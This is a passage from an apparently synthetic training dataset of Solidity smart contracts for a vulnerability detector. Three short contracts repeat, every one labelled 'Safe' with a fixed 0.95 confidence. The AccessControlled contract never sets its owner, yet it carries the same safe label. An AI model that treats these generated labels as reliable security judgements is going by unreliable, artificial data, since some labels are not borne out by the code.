    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 542",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 543",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 544",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 545",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 546",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 547",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 548",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 549",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 550",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 551",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 552",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 553",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 554",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 555",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 556",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 557",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 558",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 559",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 560",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 561",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 562",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 563",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 564",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 565",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 566",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 567",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 568",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 569",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 570",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 571",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
